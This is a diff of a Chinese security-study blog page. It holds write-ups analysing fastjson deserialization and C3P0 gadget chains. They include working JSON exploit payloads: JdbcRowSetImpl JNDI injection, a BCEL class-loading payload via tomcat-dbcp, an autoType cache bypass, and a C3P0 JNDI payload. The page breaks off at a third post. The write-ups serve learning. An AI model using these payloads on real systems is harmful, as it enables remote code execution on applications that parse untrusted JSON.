@@ -181,6 +181,393 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/23/fastjson/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://github.com/ctwabc.png">
+      <meta itemprop="name" content="ctwabc">
+      <meta itemprop="description" content="学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ctwabc's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/06/23/fastjson/" class="post-title-link" itemprop="url">fastjson</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-06-23 22:42:06" itemprop="dateCreated datePublished" datetime="2026-06-23T22:42:06+08:00">2026-06-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-06-26 18:15:38" itemprop="dateModified" datetime="2026-06-26T18:15:38+08:00">2026-06-26</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.2k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong><em>反序列化流程分析</em></strong></p>
+<blockquote>
+<p>fastjson1.2.24</p>
+</blockquote>
+<p><img src="/2026/06/23/fastjson/fastjson2.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson1.png"></p>
+<p>获得一个默认的json解析器</p>
+<p><img src="/2026/06/23/fastjson/fastjson3.png"></p>
+<p>在按json字符串去解析，匹配到了左大括号。</p>
+<p><img src="/2026/06/23/fastjson/fastjson4.png"></p>
+<p>json字符串就是一个键值对，取<code>&quot; &quot;</code>之间的键，取完之后如果不是<code>:</code>就抛异常</p>
+<p><img src="/2026/06/23/fastjson/fastjson5.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson6.png"></p>
+<p>遇到@type就得按对应的类去解析了。跟进到loadClass()</p>
+<p><img src="/2026/06/23/fastjson/fastjson7.png"></p>
+<p>先从mappings这个缓存表中获取，缓存列没有就到下面的判断，这个两个if判断是为解决loadClass()不能加载的格式，这些格式不做处理的话forName()才可以加载。可以看到是通过裁切字符串来处理的，不过我们这个类就不需要了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson8.png"></p>
+<p>加载类，然后放到缓存表里，返回。</p>
+<p><img src="/2026/06/23/fastjson/fastjson9.png"></p>
+<p>获取这个类的反序列化器，跟进。</p>
+<p><img src="/2026/06/23/fastjson/fastjson10.png"></p>
+<p>这是ParserConfig的构造方法，可以看到这个ParserConfig有很多类的反序列化器，不过我们这个类是自己创的肯定不在这些反序列化器的列表了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson11.png"></p>
+<p>确实没找到，跟进。</p>
+<p><img src="/2026/06/23/fastjson/fastjson12.png"></p>
+<p>还是在找，找肯定是找不到的，找到最后会到这里，如图</p>
+<p><img src="/2026/06/23/fastjson/fastjson13.png"></p>
+<p>因为找不到，所以创建一个反序列化器，他是当这个类是JavaBean来创建的，跟进。</p>
+<p><img src="/2026/06/23/fastjson/fastjson15.png"></p>
+<p>这个就是在收集这个类的信息，这三个循环会把这个类的所有方法遍历一遍，然后把符合条件的set方法、公开属性、get方法记录。我们一个一个看</p>
+<p><img src="/2026/06/23/fastjson/fastjson16.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson17.png"></p>
+<p>这个方法的长度要大于等于4，不能是static方法，返回值得是void，参数只有一个，还得以set开头。propetyName记录的是set后面的部分并且将其转成小写，在这个代码中就是age。field找的是这个类的成员变量中跟propertyName一样的。</p>
+<p><img src="/2026/06/23/fastjson/fastjson18.png"></p>
+<p>然后就是把获得的信息汇总以后封装成FieldInfo然后放到fieldList里面。在我们这个类中会有setName和setAge在这个循环中放进去。</p>
+<p>因为这个类没有pulic的成员变量所以不会进到这个循环。</p>
+<p>看一下第三个循环。</p>
+<p><img src="/2026/06/23/fastjson/fastjson19.png"></p>
+<p>找get方法，方法名大于等于4，不能是静态方法，得以get开头，不能有参数，返回值类型得是if判断里面的这些类。</p>
+<p><img src="/2026/06/23/fastjson/fastjson20.png"></p>
+<p>他会根据properyName去查重，所以说如果有setMap的话就不能放getMap了。</p>
+<p>这次进到FieldInfo看一下。</p>
+<p><img src="/2026/06/23/fastjson/fastjson21.png"></p>
+<p>其他的都不太重要主要是这一部分，这里有一个getOnly的变量，我们希望他是true理由的话后面再写。这个方法得是参数不为一的方法，但我们知道set方法的参数是一不可能满足，只能寄希望于get方法，所以我这个Person类专门整了一个Map成员变量且只有get方法。这样就能把getOnly改成true了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson23.png"></p>
+<p>方法的最后new出JavaBeanInfo对象，这个方法就结束了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson22.png"></p>
+<p>会到这个方法，到这个部分。如果getOnly是false的话这里的asmEnable就是true，这样的话会走到asmFactory.createJavaBeanDeserializer()，这有什么问题呢？问题就是不能调试了，很烦。为了解决这个问题才有了getOnly改成true这一部分。我们看一下getOnly是怎么发挥作用的。</p>
+<p><img src="/2026/06/23/fastjson/fastjson24.png"></p>
+<p>遍历fieldInfo，有filedInfo的getOnly时true的的话，把asmEnable关掉。</p>
+<p><img src="/2026/06/23/fastjson/fastjson25.png"></p>
+<p>开始正式的反序列化了，其实就是赋值。通过循环从filedInfo里一个个的拿，这里我门拿到的是age，然后从json字符串那age对应的值，然后检查匹不匹配。这个if else非常多，就是为了匹配各种数据。</p>
+<p><img src="/2026/06/23/fastjson/fastjson26.png"></p>
+<p>然后到这里，在创建Person实例，我们跟进去看一下。</p>
+<p><img src="/2026/06/23/fastjson/fastjson27.png"></p>
+<p>从beanInfo里面把构造函数拿过来，然后newInstance。</p>
+<p><img src="/2026/06/23/fastjson/fastjson28.png"></p>
+<p>到这里就是要赋值了，跟进去。</p>
+<p><img src="/2026/06/23/fastjson/fastjson29.png"></p>
+<p>还是一样从fieldInfo拿到方法。</p>
+<p><img src="/2026/06/23/fastjson/fastjson30.png"></p>
+<p>反射调用赋值。</p>
+<p>循环结束了就拿到反序列化以后的对象了。<br>简单看一下序列化的过程<img src="/2026/06/23/fastjson/fastjson37.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson38.png"></p>
+<p><img src="/2026/06/23/fastjson/fastjson39.png"></p>
+<p>扫描这个类的所有public方法，进行筛选总结如下:</p>
+<p>get方法:</p>
+<ul>
+<li>不能是static方法</li>
+<li>返回值不能是void，ClassLoader，</li>
+<li>参数数量得是0</li>
+<li>方法名得以get开头</li>
+<li>方法名长度要大于等于4</li>
+<li>不能是getClass()，getDeclaringClass，getMetaClass</li>
+</ul>
+<p>is方法:</p>
+<ul>
+<li>不能是static方法</li>
+<li>返回值类型的事bool</li>
+<li>参数数量得是0</li>
+<li>方法名得以is开头</li>
+<li>方法名长度要大于等于3</li>
+<li>不能是getMetaClass</li>
+</ul>
+<p>扫描这个类的所有public方法，方法不能是static，返回值不能是void，参数数量得是0，返回值不能是ClassLoader，不能是getMetaClass，方法得以get开头，方法长度要大于等于4，不能是getClass方法，不能是getDeclaringClass方法，和反序列化一样有propertyName。is开头的也可以，is开头时方法名要大于等于3，返回类型得是bool。序列化时会把这些方法都调用一遍。</p>
+<p><strong><em>总结</em></strong></p>
+<p>有@type的时候，反序列化时会调用按指定对象的符合条件的set、get方法提供了要赋值的值的方法。</p>
+<p>主要关注了类的方法。例如，就算没有name这个成员变量，只要有setName，且json字符串写了name对应的值，就可以调用。</p>
+<p><strong><em>漏洞利用</em></strong></p>
+<blockquote>
+<p>&lt;&#x3D;fastjson1.2.24</p>
+</blockquote>
+<p><img src="/2026/06/23/fastjson/fastjson31.png"></p>
+<p>不太清楚怎么找到的。可以看到有JNDI注入，DataSourceName可以控制，有setDataSourceName方法，找一下调用connect的方法。总共就三个很好整。</p>
+<p><img src="/2026/06/23/fastjson/fastjson32.png"></p>
+<p>结束了，很简单。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
+
+<p>需要出网，下面这个不需要出网。</p>
+<p><img src="/2026/06/23/fastjson/fastjson33.png"></p>
+<p>这个ClassLoader在这里com.sun.org.apache.bcel.internal.util。bcel可以把$$BCEL$$这个后面部分接<code>.class</code> 字节码文件，通过特殊的编码方式（类似 Base64 变体）<strong>压缩并编码成一个纯文本字符串</strong>的字符串。然后把这个部分加载出来。关键还是这个ClassLoader只要ClassLoader是支持BCEL就好了。</p>
+<p><img src="/2026/06/23/fastjson/fastjson34.png"></p>
+<p>这个是tomcat的部分，在tomcat-dbcp。他这里有forName而且是初始化的，其中driverClassName和driverClassLoader都是可以控制的。然后就是找这个类的那一个get或set方法会调到这里。</p>
+<p><img src="/2026/06/23/fastjson/fastjson35.png"></p>
+<p>就是这个方法get方法，他会调用createDataSource()</p>
+<p><img src="/2026/06/23/fastjson/fastjson36.png"></p>
+<p>这个createDataSource又会调用createConnectionFactory()，这样就结束了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = convert(<span class="string">&quot;/Users/ctwabc/JavaClasses/Test.class&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> +code +<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">JSONObject.parseObject(s);</span><br></pre></td></tr></table></figure>
+
+<p>因为会调用到getConnection所以需要序列化。</p>
+<blockquote>
+<p>&lt;&#x3D;fastjson1.2.47通杀</p>
+<p>下面的代码都是1.2.25版本的，了解一下增加了什么东西，以及绕过</p>
+</blockquote>
+<p><img src="/2026/06/23/fastjson/fastjson40.png"></p>
+<p>这个部分多了个checkAutoType(),我们看一下。</p>
+<p>默认情况下<code>autoTypeSupport</code>是<code>false</code>，<code>expectClass</code>是<code>null</code></p>
+<p>我就写成注释了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">		<span class="comment">// 如果autoTypeSupport开启了的话，进行白名单+黑名单的检测</span></span><br><span class="line">  	<span class="comment">// 白名单从配置读取，黑名单的话各版本之间都有不同，我们考虑的是默认情况不会进入到这个if里面</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">// 从mappings缓存中读取，我们的绕过利用的就是这个</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 这个应该也算是从缓存读取</span></span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">// 从缓存中读取到的话进行简单的判断，然后返回</span></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">      	<span class="comment">// 因为期望类是空的不用太担心</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="comment">// 绕过的方法是不会走到下面的，大概了解一下</span></span><br><span class="line">		<span class="comment">// 黑名单+白名单的检测</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//默认情况下两个都是false，进不去</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="comment">// 加载的类不能是classloader,datasource</span></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 有期望类的话就得匹配期望类</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找一下往mappings缓存里放的方法。</p>
+<p>总共就两个方法</p>
+<p><img src="/2026/06/23/fastjson/fastjson41.png"></p>
+<p>这个是把内置类放进缓存表里，我们是无法控制放进去的类的pass掉</p>
+<p><img src="/2026/06/23/fastjson/fastjson42.png"></p>
+<p>只剩这个了，再找一下谁调用了loadClass</p>
+<p><img src="/2026/06/23/fastjson/fastjson43.png"></p>
+<p>也就这个了，MiscCodec就是反序列化器，回忆一下如图</p>
+<p><img src="/2026/06/23/fastjson/fastjson9.png"></p>
+<p>之前流程分析的时候，有一部分就是获取反序列化器，那个时候因为这个Person类是我们自己定义的类没有对应的反序列化器，所以自己创建了一个反序列化器，而这个MiscCodec就是预先在ParserConfig里放好的反序列化器，他可以反序列化Class类，只要这个strVal可控，我们就可以把恶意类预先放到缓存里。</p>
+<p><img src="/2026/06/23/fastjson/fastjson44.png"></p>
+<p>这一部分就是给strVal赋值。</p>
+<p>总结一下</p>
+<p>@type:xxx这部分结束以后必须是val，strVal就是val对应的值部分。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(s);</span><br></pre></td></tr></table></figure>
+
+<p>还没写完</p>
+<p>推荐视频:<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.337.search-card.all.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.337.search-card.all.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pP411N726?spm_id_from=333.788.videopod.sections&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1pP411N726?spm_id_from=333.788.videopod.sections&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1bG4y157Ef?spm_id_from=333.788.videopod.sections&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1bG4y157Ef?spm_id_from=333.788.videopod.sections&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/22/c3p0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://github.com/ctwabc.png">
+      <meta itemprop="name" content="ctwabc">
+      <meta itemprop="description" content="学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ctwabc's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/06/22/c3p0/" class="post-title-link" itemprop="url">C3P0</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-06-22 23:23:08" itemprop="dateCreated datePublished" datetime="2026-06-22T23:23:08+08:00">2026-06-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-06-25 22:57:54" itemprop="dateModified" datetime="2026-06-25T22:57:54+08:00">2026-06-25</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.3k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><em><strong>URLClassLoader</strong></em></p>
+<p>入口点是<code>PoolBackedDataSourceBase</code>这个类的<code>readObject</code>方法，如下图</p>
+<p><img src="/2026/06/22/c3p0/c3p01.png" alt="截图"></p>
+<p><code>PoolBackedDataSourceBase</code>有<code>connectionPoolDataSource</code>的成员变量，可以看到在<code>readObject</code>中会调用getObject方法以后会将其强转为<code>ConnectionPoolDataSource</code>类。但是<code>ConnectionPoolDataSource</code>类是不能序列化的，如图</p>
+<p><img src="/2026/06/22/c3p0/c3p02.png" alt="截图"></p>
+<p>既然不能序列化，那可以肯定的是<code>PoolBackedDataSourceBase</code>的writeObject方法肯定是做了一些处理的。</p>
+<p><img src="/2026/06/22/c3p0/c3p03.png" alt="截图"></p>
+<p>首先会尝试着将这个成员变量序列化，失败的话调用<code>ReferenceIndirector.indirectForm()</code>，我们看一下这个方法在干什么。</p>
+<p><img src="/2026/06/22/c3p0/c3p04.png" alt="截图"></p>
+<p>其实就是一层封装，封装成可以序列化的类。而且我们可以知道他是获得了<code>Reference</code>的，之前的JNDI用的就是这个。会到<code>readObject</code>方法，这次跟进一下<code>getObject</code>方法</p>
+<p><img src="/2026/06/22/c3p0/c3p05.png"></p>
+<p>本来以为这个<code>lookup</code>方法可以利用，看的文章写反序列化的时候<code>contextName</code>默认是null且不可控的。继续跟进</p>
+<p><img src="/2026/06/22/c3p0/c3p06.png" alt="截图"></p>
+<p>这个方法的流程相当眼熟了，可以说是把之前jndi流程中的reference的利用部分写到了一块地方，所以说利用点就是类的远程加载了。</p>
+<p>我猜这个链就是看到这个方法以后倒着找的。</p>
+<p><strong>利用</strong></p>
+<p><img src="/2026/06/22/c3p0/c3p07.png" alt="截图"></p>
+<p>关键就是重写这个方法了，因为<code>Reference</code>就是靠这个方法获取的。剩下的就是把它放到<code>PoolBackedDataSourceBase</code>然后序列化反序列化了。</p>
+<p><em><strong>JNDI注入</strong></em></p>
+<blockquote>
+<p> 倒着分析有逻辑一点，写起来不方便，还是顺着写吧</p>
+</blockquote>
+<p>JndiRefConnectionPoolDataSource这个类有非常多的get和set方法，其中setJndiName可以给jndiName这个属性赋值。</p>
+<p>这个类还有一个setLoginTimeout()方法。</p>
+<p><img src="/2026/06/22/c3p0/c3p08.png" alt="截图"></p>
+<p><img src="/2026/06/22/c3p0/c3p09.png" alt="截图"></p>
+<p>跟进</p>
+<p><img src="/2026/06/22/c3p0/c3p010.png" alt="截图"></p>
+<p>这个getNestedDataSource()返回的是JndiRefForwardingDataSource类，因为我们这个场景要用到的就是jndi，他返回的就是对应的类了。跟进</p>
+<p><img src="/2026/06/22/c3p0/c3p011.png" alt="截图"></p>
+<p>跟到inner()</p>
+<p><img src="/2026/06/22/c3p0/c3p012.png" alt="截图"></p>
+<p>跟进</p>
+<p><img src="/2026/06/22/c3p0/c3p013.png" alt="截图"></p>
+<p>有lookup且jndiName我们可以控制，剩下的就是jndi的流程了。</p>
+<p>也是先找到这个方法，再往前找。</p>
+<p><strong>利用</strong></p>
+<p>fastjson反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,\&quot;JndiName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;, \&quot;LoginTimeout\&quot;:0&#125;&quot;;</span><br><span class="line">JSON.parse(payload);</span><br></pre></td></tr></table></figure>
+
+<p>参考文章:<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/22/jdkserial/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://github.com/ctwabc.png">
+      <meta itemprop="name" content="ctwabc">
+      <meta itemprop="description" content="学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ctwabc's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/06/22/jdkserial/" class="post-title-link" itemprop="url">jdkserial</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
